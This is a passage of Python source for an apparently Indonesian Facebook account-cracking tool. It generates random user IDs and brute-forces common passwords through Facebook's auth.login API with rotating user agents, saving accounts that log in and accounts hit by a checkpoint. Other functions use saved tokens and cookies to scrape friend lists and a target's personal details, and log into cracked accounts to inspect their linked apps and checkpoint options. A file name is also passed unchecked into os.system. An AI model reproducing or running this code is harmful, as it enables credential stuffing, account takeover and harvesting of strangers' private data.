	elif HikmatXD in ["2","02"]:
		cloning_2011_2014()
	elif HikmatXD in ["3","03"]:
		hasil_cloning()
	elif HikmatXD in ["0","00"]:
		jalan(f"{garis} terimakasih telah memakai script cmbf ya bree:) ")
		exit()
	else:
		jalan(f"{garis} isi yang benar ")
		menu()

def hasil_cloning():
	print("")
	x=f"{P2}[01] lihat hasil crack {H2}ok\n{P2}[02] lihat hasil crack {K2}cp\n{P2}[{H2}03{P2}] kembali"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	inhasil = input(f"{garis} pilih : {H}")
	if inhasil in ["1","01"]:
		try:c_o_k = os.listdir('OK')
		except FileNotFoundError:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_cloning()
		if len(c_o_k)==0:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_cloning()
		else:
			x=f"\t\t{P2} hasil ok"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			cuih = 0
			lol = {}
			for kaoo in c_o_k:
				try:hikmat = open('OK/'+kaoo,'r').readlines()
				except:continue
				cuih+=1
				if cuih<10:
					__oo = '0'+str(cuih)
					lol.update({str(cuih):str(kaoo)})
					lol.update({__oo:str(kaoo)})
					x=f"{P2}[{H2}{__oo}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+__oo+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
				else:
					lol.update({str(cuih):str(kaoo)})
					x=f"{P2}[{H2}{cuih}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+str(cuih)+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
			x=f"{P2}pilih hasil untuk ditampilkan"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			geeh = input(garis+" pilih : "+H)
			try:geh = lol[geeh]
			except KeyError:
				print(garis+" pilihan tidak ada")
				exit()
			try:lin = open('OK/'+geh,'r').read()
			except:
				jalan(garis+" file tidak ditemukan") 
				time.sleep(2)
				hasil_cloning()
			jalan(garis+" list akun ok kamu\n") 
			#x=f"{P2}cd OK*-->{geh}"
			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			hus = os.system('cd OK && cat '+geh)
			jalan("\n"+garis+" list akun ok kamu") 
			input(garis+" kembali")
			menu()
	elif inhasil in ["2","02"]:
		try:c_o_k = os.listdir('CP')
		except FileNotFoundError:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_cloning()
		if len(c_o_k)==0:
			jalan(garis+" tidak ada hasil")
			time.sleep(2)
			hasil_cloning()
		else:
			x=f"\t\t{P2} hasil cp"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			cuih = 0
			lol = {}
			for kaoo in c_o_k:
				try:hikmat = open('CP/'+kaoo,'r').readlines()
				except:continue
				cuih+=1
				if cuih<10:
					__oo = '0'+str(cuih)
					lol.update({str(cuih):str(kaoo)})
					lol.update({__oo:str(kaoo)})
					x=f"{P2}[{H2}{__oo}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+__oo+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
				else:
					lol.update({str(cuih):str(kaoo)})
					x=f"{P2}[{H2}{cuih}{P2}] {kaoo} • {str(len(hikmat))} akun{P2}"
					vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
					#print(P+' •'+H+str(cuih)+P+'• '+kaoo+' • '+str(len(hikmat))+' akun'+P)
			x=f"{P2}pilih hasil untuk ditampilkan"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			geeh = input(garis+" pilih : "+H)
			try:geh = lol[geeh]
			except KeyError:
				print(garis+" pilihan tidak ada")
				exit()
			try:lin = open('CP/'+geh,'r').read()
			except:
				jalan(garis+" file tidak ditemukan") 
				time.sleep(2)
				hasil_cloning()
			jalan(garis+" list akun cp kamu\n") 
			#x=f"{P2}cd CP*-->{geh}"
			#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			hus = os.system('cd CP && cat '+geh)
			jalan("\n"+garis+" list akun cp kamu") 
			input(garis+" kembali")
			menu()
	elif inhasil in ["0","00"]:
		menu()
	else:
		jalan(f"{garis} isi yang benar ")
		hasil_cloning()



def cloning_2011_2014():
	x = 11111111
	xx = 99999999
	idx = "10000" 
	print("")
	#x=f"{P2}contoh : {H2}4000"
	#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	limit = int(input("%s mau berapa id : %s"%(garis,H)))
	try:
		for n in range(limit):
			_ = random.randint(x,xx)
			__ = idx
			id.append(__+str(_))
		print(f"{garis} total id : {H}{len(id)}")
		with tread(max_workers=30) as flameXD:
			x=f"{P2}contoh password : {H2}123456,1234567,123456789\n{P2}pakai ({H2},{P2}) untuk menambahkan password tambahan"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			list_pw = input(f"{garis} masukan password list : {H}")
			if len(list_pw)<=5:
					exit(f"{garis} password minimal 6 angka ")
			x=f"{P2}crack memakai password {H2}{list_pw}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			x=f"{P2}crack cp tersimpan di {K2}CP/{cpz}\n{P2}crack ok tersimpan di {H2}OK/{okz}\n{P2}mode pesawatkan 5 detik klo tidak ada hasil!! "
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			for user in id:
				flameXD.submit(api, user, list_pw.split(","))
		print("")
		if ok != 0 or cp != 0:
			x=f"{P2}hasil cp mu : {K2}{cp}\n{P2}hasil ok mu : {H2}{ok}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(garis+" kembali ")
			menu()
		else:
			x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(garis+" kembali ")
			menu()
	except Exception as e:exit(str(e))

def cloning_2009_2010():
	x = 111111111
	xx = 999999999
	idx = "100000" 
	print("")
	#x=f"{P2}contoh : {H2}4000"
	#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	limit = int(input("%s mau berapa id : %s"%(garis,H)))
	try:
		for n in range(limit):
			_ = random.randint(x,xx)
			__ = idx
			id.append(__+str(_))
		print(f"{garis} total id : {H}{len(id)}")
		with tread(max_workers=30) as flameXD:
			x=f"{P2}contoh password : {H2}123456,1234567,123456789\n{P2}pakai ({H2},{P2}) untuk menambahkan password tambahan"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			list_pw = input(f"{garis} masukan password list : {H}")
			if len(list_pw)<=5:
					exit(f"{garis} password minimal 6 angka ")
			x=f"{P2}crack memakai password {H2}{list_pw}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			x=f"{P2}crack cp tersimpan di {K2}CP/{cpz}\n{P2}crack ok tersimpan di {H2}OK/{okz}\n{P2}mode pesawatkan 5 detik klo tidak ada hasil!! "
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			for user in id:
				flameXD.submit(api, user, list_pw.split(","))
		print("")
		if ok != 0 or cp != 0:
			x=f"{P2}hasil cp mu : {K2}{cp}\n{P2}hasil ok mu : {H2}{ok}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(garis+" kembali ")
			menu()
		else:
			x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(garis+" kembali ")
			menu()
	except Exception as e:exit(str(e))

def api(uiz, pwr):
	global cp,ok,flameXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10; RMX2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; TECNO CG6j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-J730F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; RMX3085 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/378.0.0.18.112;]","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; LYF/F320B/LYF-F320B-002-02-56-250322;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.3.2","Mozilla/5.0 (Mobile; Qmobile_4Gplus; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Mobile; Tech_Pad_Kaios_One_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.1","Mozilla/5.0 (X11; CrOS armv7l 13597.84.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.187 Safari/537.36 Mozilla/5.0 (Mobile; Nokia 8000 4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.4","Mozilla/5.0 (Mobile; Nokia_800_Tough; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2","Mozilla/5.0 (Mobile; LYF/F300B/LYF-F300B-001-01-15-130718-i;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5 Edg/93.0.4577.63","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-45-051119;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LOGIC_LOGIC_B8K_3G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.1.2","Mozilla/5.0 (Linux; rv:48.0; U; US) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; LYF/F220B/LYF-F220B-003-01-50-091120;Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5","Mozilla/5.0 (Mobile; Digit_Digit4G_4G; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.5.2.2"]
	ua = random.choice(ua_crack)
	runc= random.choice([K,M,U,O,B,H]) 
	sys.stdout.write("\r %sheyoo %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,flameXD,len(id),H,ok,K,cp)); sys.stdout.flush()
	for pw in pwr:
		pw = pw.lower()
		ses = requests.Session()
		headers = {
			"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
			"x-fb-sim-hni": str(random.randint(20000, 40000)), 
			"x-fb-net-hni": str(random.randint(20000, 40000)), 
			"x-fb-connection-quality": "EXCELLENT",
			"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
			"user-agent": ua, 
			"content-type": "application/x-www-form-urlencoded", 
			"x-fb-http-engine": "Liger"
		}
		response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uiz)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
		if "session_key" in response.text and "EAAG" in response.text:
			print(f"\r {H}*--> {uiz}|{pw}")
			open('OK/'+okz,'a').write(uiz+'|'+pw+'\n')
			ok+=1
			break
		elif "www.facebook.com" in response.json()["error_msg"]:
			print(f"\r {K}*--> {uiz}|{pw}")
			open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
			cp+=1
			break
		else:
			continue

	flameXD +=1


def dump_public():
	try:
		os.mkdir('dump')
	except:pass
	try:
		xaco = input(f"{garis} id public  :\x1b[38;5;46m ")
		cuy = input(f"{garis} nama file  :\x1b[38;5;46m ")
		print("")
		wkwk  = ('dump/' + cuy + '.json').replace(' ', '_')
		xxx = open(wkwk, 'w')
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(xaco,token),cookies=coki).json()
		for fuck in cyna['friends']['data']:
			id.append(fuck['id']+'|'+fuck['name'])
			xxx.write(fuck['id']+'|'+fuck['name'] + '\n')
			fr = random.choice([O,B,H,P,K,M,U])
			sys.stdout.write(f'\r\033[0m *--> %s {fr}• \033[0m%s                  \r\n\x1b[38;5;231m [ \x1b[38;5;46m%s\x1b[38;5;231m ] [ \x1b[38;5;46m%s\x1b[38;5;231m ] \x1b[0;96mproses dump ID...'%(fuck['id'],fuck['name'],('{garis}'), len(id)
			)); sys.stdout.flush()
			time.sleep(0.0050)
			
		xxx.close()
		jalan(f"\n{garis} berhasil dump id dari publik");print(f"{garis} salin output file *--> [ %s%s%s ]"%(H,wkwk,P))
		input(f"{garis} kembali ");menu()
	except (KeyError,IOError):
		os.remove(wkwk)
		jalan(f"{garis} gagal dump id, kemungkinan id tidak ada.\n")
		input(f"{garis} kembali ");menu()


def dump_publicv2():
	kuntol=0
	tutlu=[]
	it = input(f"{garis} id target :"+H+" ")
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		ka = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(it,token),cookies=coki)
		oioo = json.loads(ka.text)
		for fuck in oioo['friends']['data']:
			tutlu.append(fuck['id'])
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token),cookies=coki).json()
		print(f"{garis} name : %s%s"%(H,cyna['name']))
		print(f"{garis} total friends : {H}{len(tutlu)}")
	except (KeyError,IOError):
		jalan(f"{garis} cookie kadaluarsa")
		login()
	tl=[]
	to=[]
	ttl_tar=[]
	tlo=[]
	idl=[]
	lim = input(f"{garis} limit dump id :"+H+" ")
	token = open('token.txt','r').read()
	cookie = open('cookie.txt','r').read()
	coki = {"cookie":cookie}
	ka = requests.get('https://graph.facebook.com/%s?fields=friends.limit(%s)&access_token=%s'%(it,lim,token),cookies=coki)
	oioo = json.loads(ka.text)
	for fuck in oioo['friends']['data']:
		tl.append(fuck['id'])
	print("")
	x=f"{P2}[01] id urutan new\n{P2}[02] id urutan old\n{P2}[03] id urutan random"
	vprint(panel(x,style=f"{H3}"))
	GlukTzy = input(garis+" pilih : "+H)
	if GlukTzy in ['2','02']:
		for bacot in tl:
			idl.append(bacot)
	elif GlukTzy in ['1','01']:
		for bacot in tl:
			idl.insert(0,bacot)
	elif GlukTzy in ['3','03']:
		for bacot in tl:
			xx = random.randint(0,len(idl))
			idl.insert(xx,bacot)
	else:
		jalan(garis+" isi yang benar")
		exit()
	print("")
	#random_uidz()
	for uik in idl:
		try:
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(id,token),cookies=coki)
			x = json.loads(xn.text)
			try:lok = x["locale"]
			except (KeyError,IOError):
				lok = "-"
			coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(id,token),cookies=coki)
			el = json.loads(coa.text)
			try:lk = el["name"]
			except (KeyError,IOError):
				lk = "-"
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			ciner = requests.get('https://graph.facebook.com/%s?access_token=%s'%(uik,token),cookies=coki).json()
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(uik,token),cookies=coki)
			eil = json.loads(cyna.text)
			try:
				for fuck in eil['friends']['data']:
					to.append(fuck['id']+'|'+fuck['name'])
			except KeyError:
				pass
			kuntol+=1
			print(f"\r{P} [{H}{str(kuntol)}{P}] {uik}|{len(to)}")
			to.clear()
		except KeyError:
			print(K+'*--> '+M+'akun terspam')
	print("")
	x=f"{P2}salin hasil nya cokk biar gk ulang dump lagi!!"
	vprint(panel(x,style=f"{H3}"))
	input(f"{garis} enter untuk kembali")
	menu()

def check_ingfo_akun():
	idt=[]
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
	except (KeyError,IOError):
		jalan(garis+" cookie kadaluarsa");cek_cookie()
	idt = input(garis+" id target :%s "%(H))
	try:
		zx = requests.get("https://graph.facebook.com/"+idt+"?access_token=%s"%(token),cookies=coki);zy = json.loads(zx.text)
	except (KeyError,IOError):jalan(garis+" id tidak ditemukan");menu()
	try:nm = zy["name"]
	except (KeyError,IOError):nm = (M+"-")
	try:nd = zy["first_name"]
	except (KeyError,IOError):nd = (M+"-")
	try:nt = zy["middle_name"]
	except (KeyError,IOError):nt = (M+"-")
	try:nb = zy["last_name"]
	except (KeyError,IOError):nb = (M+"-")
	try:ut = zy["birthday"]
	except (KeyError,IOError):ut = (M+"-")
	try:gd = zy["gender"]
	except (KeyError,IOError):gd = (M+"-")
	try:em = zy["email"]
	except (KeyError,IOError):em = (M+"-")
	try:lk = zy["link"]
	except (KeyError,IOError):lk = (M+"-")
	try:us = zy["username"]
	except (KeyError,IOError):us = (M+"-")
	try:rg = zy["religion"]
	except (KeyError,IOError):rg = (M+"-")
	try:rl = zy["relationship_status"]
	except (KeyError,IOError):rl = (M+"-")
	try:rls = zy["significant_other"]["name"]
	except (KeyError,IOError):rls = (M+"-")
	try:lc = zy["location"]["name"]
	except (KeyError,IOError):lc = (M+"-")
	try:ht = zy["hometown"]["name"]
	except (KeyError,IOError):ht = (M+"-")
	try:ab = zy["about"]
	except (KeyError,IOError):ab = (M+"-")
	try:lo = zy["locale"]
	except (KeyError,IOError):lo = (M+"-")
	#try:ppk = zy["education"]["id"]
	#except (KeyError,IOError):ppk = (M+"-")
	print("")
	jalan(garis+" nama : %s%s"%(H,nm))
	jalan(garis+" nama depan : %s%s"%(H,nd))
	jalan(garis+" nama tengah : %s%s"%(H,nt))
	jalan(garis+" nama belakang : %s%s"%(H,nb))
	jalan(garis+" TTL : %s%s"%(H,ut))
	jalan(garis+" gender : %s%s"%(H,gd))
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cy = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(idt,token),cookies=coki)
		z = json.loads(cy.text)
		for i in z['friends']['data']:
			id.append(i['id'])
	except:pass
	jalan(garis+" total friends : "+H+"%s"%str(len(id)));time.sleep(0.03)
	lao=[]
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(90000)&access_token=%s'%(idt,token),cookies=coki)
		eil = json.loads(cyna.text)
		for fuck in eil['subscribers']['data']:
			lao.append(fuck['id'])
	except:pass
	jalan(garis+" total followers : "+H+"%s"%(len(lao)));time.sleep(0.03)
	jalan(garis+" email : %s%s"%(H,em))
	jalan(garis+" link : %s%s"%(H,lk))
	jalan(garis+" username : %s%s"%(H,us))
	jalan(garis+" agama : %s%s"%(H,rg))
	jalan(garis+" status hubungan : %s%s"%(H,rl))
	jalan(garis+" hubungan dengan : %s%s"%(H,rls))
	jalan(garis+" tempat tinggal : %s%s"%(H,lc))
	jalan(garis+" tempat asal : %s%s"%(H,ht))
	jalan(garis+" tentang : %s%s"%(H,ab))
	jalan(garis+" locale : %s%s"%(H,lo))
	input(garis+" enter untuk kembali");menu()

def cracked_publickey():
	x=f"{P2}ketik {H2}y{P2} untuk crack massal & {P2}ketik {H2}t{P2} untuk tunggal & ketik {H2}g {P2}untuk email"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	cuy = input(f"{garis} Pilih : {H}")
	if cuy in ["y","Y"]:
		massal_cracked_public()
	elif cuy in ["t","T"]:
		cracked_public()
	elif cuy in ["g","G"]:
		cracked_email()
	else:
		jalan(f"{garis} isi yang benar ")
		cracked_publickey() 

def option_sesi():
	try:c_o_k = os.listdir('CP')
	except FileNotFoundError:
		jalan(garis+" tidak ada hasil")
		time.sleep(2)
		hasil_crack()
	if len(c_o_k)==0:
		jalan(garis+" tidak ada hasil")
		time.sleep(2)
		hasil_crack()
	else:
		x=f"\t\t{P2} hasil cp"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		cuih = 0
		lol = {}
		for kaoo in c_o_k:
			try:flame = open('CP/'+kaoo,'r').readlines()
			except:continue
			cuih+=1
			if cuih<10:
				__oo = '0'+str(cuih)
				lol.update({str(cuih):str(kaoo)})
				lol.update({__oo:str(kaoo)})
				x=f"{P2}{kaoo} • {str(len(flame))} akun{P2}"
				vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			else:
				lol.update({str(cuih):str(kaoo)})
				x=f"{P2} {kaoo} • {str(len(flame))} akun{P2}"
				vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	x=f"{P2}contoh : CP/{cpz}"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	files = input(f"{garis} pilih yang mau di cek : {H}")
	try:
		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n%s files %s%s%s tidak ada!"%(garis,H,files,P))
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print(f"\n{garis} account : "+(kontol.replace(" + ","")))
		try:
			flamexd(titid[0].replace(" + ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	#os.remove(f"CP/{cpz}")
	input(f"{garis} enter untuk kembali ")
	menu()
	#exit("\n%s done ya cuy"%(garis))

def flamexd(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua_crack = ["Mozilla/5.0 (Linux; Android 12; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_EN;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	ses.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": mb,"content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": mb+"/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	data = {}
	ged = sop(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	run = sop(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	if "c_user" in ses.cookies:
		kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
		run = parser(ses.get("https://free.facebook.com/settings/apps/tabbed/", cookies={"cookie":kuki}).text, "html.parser")
		xe = [re.findall("\<span.*?href=\".*?\">(.*?)<\/a><\/span>.*?\<div class=\".*?\">(.*?)<\/div>", str(td)) for td in run.find_all("td", {"aria-hidden":"false"})][2:]
		x=f"{P2}akun yang mungkin terkait apk active : {str(len(xe))}"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		#print(f"\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Akun Yang Mungkin Terkait Dengan Facebook : %s"%(str(len(xe))))
		num = 0
		for _ in xe:
			num += 1
			print("  "+str(num)+" "+_[0][0]+", "+_[0][1])
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {"fb_dtsg": dtsg,"fb_dtsg": dtsg,"jazoest": jzst,"jazoest": jzst,"checkpoint_data":"","submit[Continue]":"Lanjutkan","nh": nh}
		xnxx = sop(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print(f"{garis} total opsi yang tersedia  "+str(len(ngew)))
		for opt in range(len(ngew)):
			print(" ["+str(opt+1)+P+"] "+K+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s[%s!%s] %s"%(P,M,P,oh))
	else:
		print(f"{garis} error login failed!\n\x1b[0m")

def listen():
	flame = "[white][[green]01[white]] Al-Waqiah		[white][[green]02[white]] Al-Qalam		[white][[green]03[white]] Al-Mulk"
	cetak(nel(flame, title="[white]murottal quran"))
	flame = "[white][[green]04[white]] Dj 2022		[white][[green]05[white]] Dj Terkini		[white][[green]06[white]] Terluka Ukulele"
	cetak(nel(flame, title="[white]musik enjoy"))
	ok = input(" [\x1b[0;92m•\x1b[0;97m] pilih : ")
	if ok in ["01","1"]:
		print("Tekan CTRL+Z Lalu Jalankan Ulang Enjoy Murottal");os.system("play-audio Al-Waqiah.mp3")
	if ok in ["02","2"]:
		print("Tekan CTRL+Z Lalu Jalankan Ulang Enjoy Murottal");os.system("play-audio Al-Qalam.mp3")
	if ok in ["03","3"]:
		print("Tekan CTRL+Z Lalu Jalankan Ulang Enjoy Murottal");os.system("play-audio Al-Mulk.mp3")
	if ok in ["a","A"]:
		print("Tekan CTRL+Z Lalu Jalankan Ulang Enjoy Musik");os.system("play-audio DJ1.mp3")
	if ok in ["b","B"]:
		print("Tekan CTRL+Z Lalu Jalankan Ulang Enjoy Musik");os.system("play-audio Lovely.mp3")
	if ok in ["c","C"]:
		print("Tekan CTRL+Z Lalu Jalankan Ulang Enjoy Musik");os.system("play-audio Terluka.mp3")
	else:
		print("""Masukkan Dengan Benar,Orang Hamil Pun Bisa""")
		time.sleep(3)
		listen()
		
def check_opsi_sesudah_crack():
	print("")
	x=f"silahkan mode pesawatkan 5 detik sebelum memulai check opsi:) atau ganti kartu sim yak:) "
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	input(f"enter untuk melanjutkan ")
	files = (f"CP/{cpz}")
	try:
